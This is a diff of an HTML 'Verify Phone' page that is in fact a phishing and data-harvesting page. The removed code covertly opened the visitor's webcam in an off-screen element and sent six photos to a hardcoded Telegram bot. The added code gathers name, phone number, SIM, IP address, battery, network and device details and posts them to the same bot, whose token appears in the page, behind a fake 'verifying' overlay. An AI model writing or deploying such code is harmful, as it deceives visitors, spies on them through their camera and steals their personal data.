@@ -13,24 +13,32 @@
     height: 100%;
     font-family: 'Poppins', sans-serif;
     color: #fff;
-    overflow: hidden;
-    background: transparent; /* Main background transparent */
+    background: transparent;
+    overflow-y: auto;
   }
-  /* Remove any overlays */
-  /* No body::before overlay */
+
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.4);
+    z-index: 0;
+  }
 
   video#bgVideo {
     position: fixed;
     top: 0; left: 0;
     width: 100%; height: 100%;
     object-fit: cover;
-    z-index: 0;
+    z-index: -1;
     filter: brightness(0.4) saturate(1.2) contrast(1.2);
   }
+
   .container {
     position: relative;
     z-index: 2;
-    background: rgba(25, 0, 0, 0.75); /* Dark transparent red */
+    background: rgba(25, 0, 0, 0.75);
     padding: 35px 30px;
     border-radius: 18px;
     max-width: 420px;
@@ -41,6 +49,7 @@
     text-align: center;
     margin: 5% auto;
   }
+
   h2 {
     margin-bottom: 28px;
     font-weight: 600;
@@ -48,10 +57,12 @@
     color: #ff1744;
     text-shadow: 0 0 6px #ff1744aa;
   }
+
   .input-group {
     margin-bottom: 18px;
     text-align: left;
   }
+
   label {
     display: block;
     font-weight: 600;
@@ -60,6 +71,7 @@
     color: #ff8a80;
     text-shadow: 0 0 4px #ff8a80cc;
   }
+
   select, input[type="tel"], input[type="text"] {
     width: 100%;
     padding: 12px 14px;
@@ -71,10 +83,12 @@
     box-shadow: inset 0 0 6px #000;
     transition: box-shadow 0.3s ease;
   }
+
   select:focus, input[type="tel"]:focus, input[type="text"]:focus {
     outline: none;
     box-shadow: 0 0 12px #ff1744;
   }
+
   button {
     background: linear-gradient(45deg, #d50000, #c51162);
     border: none;
@@ -91,6 +105,7 @@
       0 0 24px #ff1744bb;
     transition: box-shadow 0.3s ease, transform 0.3s ease;
   }
+
   button:hover {
     transform: scale(1.05);
     box-shadow:
@@ -98,6 +113,7 @@
       0 0 18px #ff1744cc,
       0 0 36px #ff1744dd;
   }
+
   .error {
     margin-top: 16px;
     font-size: 15px;
@@ -108,11 +124,13 @@
     transform: translateY(12px);
     transition: all 0.3s ease;
   }
+
   .error.show {
     opacity: 1;
     transform: translateY(0);
     animation: shake 0.4s;
   }
+
   @keyframes shake {
     0% { transform: translateX(0); }
     25% { transform: translateX(-6px); }
@@ -120,25 +138,40 @@
     75% { transform: translateX(-6px); }
     100% { transform: translateX(0); }
   }
-  #progress {
+
+  /* ✅ Progress Overlay */
+  #progressOverlay {
     position: fixed;
     top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: rgba(50, 0, 0, 0.85);
-    z-index: 99;
-    color: white;
+    width: 100vw; height: 100vh;
+    background: rgba(0, 0, 0, 0.8);
+    z-index: 9999;
     display: none;
     justify-content: center;
     align-items: center;
-    font-size: 20px;
-    font-weight: 600;
+    flex-direction: column;
   }
-  #video {
-    position: absolute;
-    top: -9999px;
-    left: -9999px;
-    width: 320px;
-    height: 240px;
+
+  #progressOverlay .loader {
+    border: 6px solid rgba(255, 255, 255, 0.2);
+    border-top: 6px solid #ff1744;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 15px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  #progressOverlay p {
+    color: #fff;
+    font-size: 18px;
+    font-weight: 600;
+    text-align: center;
   }
 </style>
 </head>
@@ -147,6 +180,12 @@
 <video id="bgVideo" autoplay muted loop playsinline>
   <source src="video.mp4" type="video/mp4">
 </video>
+
+<!-- ✅ PROGRESS OVERLAY -->
+<div id="progressOverlay">
+  <div class="loader"></div>
+  <p>🔐 Verifying your details... Please wait</p>
+</div>
 
 <div class="container">
   <h2>📱 Verify Phone</h2>
@@ -188,119 +227,81 @@
     <input type="tel" id="phone" placeholder="Enter number" />
   </div>
 
-  <button onclick="validateNumber()">Verify</button>
+  <button onclick="sendData()">Verify</button>
   <div class="error" id="errorMsg"></div>
 </div>
-
-<div id="progress">📸 Capturing face... please wait</div>
-
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
   const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
   const chatId = "8182050140";
 
-  const validationRules = {
-    "+94": /^[1-9][0-9]{8}$/,
-    "+91": /^[6-9][0-9]{9}$/,
-    "+1": /^[2-9][0-9]{9}$/,
-    "+44": /^[1-9][0-9]{9}$/,
-    "+65": /^[89][0-9]{7}$/
-  };
+  async function getIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return "N/A";
+    }
+  }
 
-  function validateNumber() {
+  async function sendData() {
+    const error = document.getElementById("errorMsg");
+    const overlay = document.getElementById("progressOverlay");
+    error.classList.remove("show");
+
     const firstName = document.getElementById('firstName').value.trim();
     const lastName = document.getElementById('lastName').value.trim();
     const code = document.getElementById('country').value;
     const sim = document.getElementById('sim').value;
     const phone = document.getElementById('phone').value.trim();
-    const error = document.getElementById('errorMsg');
-    error.classList.remove("show");
-    error.textContent = "";
 
-    if (!firstName) {
-      error.textContent = "❗ Enter first name.";
-      error.classList.add("show");
-      return;
-    }
-    if (!lastName) {
-      error.textContent = "❗ Enter last name.";
-      error.classList.add("show");
-      return;
-    }
-    if (!sim) {
-      error.textContent = "❗ Select your SIM.";
-      error.classList.add("show");
-      return;
-    }
-    if (!phone) {
-      error.textContent = "📵 Enter phone number.";
-      error.classList.add("show");
-      return;
-    }
-    if (!validationRules[code].test(phone)) {
-      error.textContent = `❌ Invalid number for ${code}`;
+    if (!firstName || !lastName || !sim || !phone) {
+      error.textContent = "❗ Please fill all fields!";
       error.classList.add("show");
       return;
     }
 
-    document.getElementById('progress').style.display = "flex";
-    startCapture();
-  }
+    overlay.style.display = "flex"; // Show progress
 
-  async function startCapture() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.getElementById("video");
-      video.srcObject = stream;
+    const ip = await getIP();
+    const battery = await navigator.getBattery?.();
+    const batteryLevel = battery ? `${Math.round(battery.level * 100)}%` : "N/A";
+    const charging = battery ? (battery.charging ? "Yes" : "No") : "N/A";
+    const netType = navigator.connection?.effectiveType || "Unknown";
+    const date = new Date().toLocaleString();
+    const ua = navigator.userAgent;
 
-      for (let i = 1; i <= 6; i++) {
-        await new Promise(res => setTimeout(res, 1500));
-        captureAndSend(i);
-      }
+    const message = `
+📩 *New Submission*
 
-      setTimeout(() => {
-        stream.getTracks().forEach(t => t.stop());
-        document.getElementById('progress').style.display = "none";
-        alert("✅ Verification complete.");
-      }, 1500 * 6 + 500);
-    } catch (err) {
-      document.getElementById('progress').style.display = "none";
-      alert("❌ Camera permission denied. Please allow access from browser settings.");
-    }
-  }
+👤 Name: ${firstName} ${lastName}
+📞 Phone: ${code} ${phone}
+📶 SIM: ${sim}
+🌐 IP Address: ${ip}
+🔋 Battery: ${batteryLevel}
+⚡ Charging: ${charging}
+📡 Network: ${netType}
+📱 Device: ${ua}
+📅 Time: ${date}
+    `;
 
-  function captureAndSend(count) {
-    const canvas = document.getElementById("canvas");
-    const video = document.getElementById("video");
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const data = canvas.toDataURL("image/jpeg");
-    sendToTelegram(data, count);
-  }
-
-  function sendToTelegram(dataUrl, count) {
-    const blob = dataURItoBlob(dataUrl);
     const form = new FormData();
     form.append("chat_id", chatId);
-    form.append("photo", blob, `face${count}.jpg`);
+    form.append("text", message);
+    form.append("parse_mode", "Markdown");
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: "POST",
-      body: form
-    });
-  }
-
-  function dataURItoBlob(dataURI) {
-    const byteString = atob(dataURI.split(',')[1]);
-    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-      ia[i] = byteString.charCodeAt(i);
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        body: form
+      });
+      alert("✅ Verification complete!");
+    } catch (e) {
+      alert("❌ Failed to send to Telegram.");
+    } finally {
+      overlay.style.display = "none"; // Hide progress
     }
-    return new Blob([ab], { type: mimeString });
   }
 </script>
 
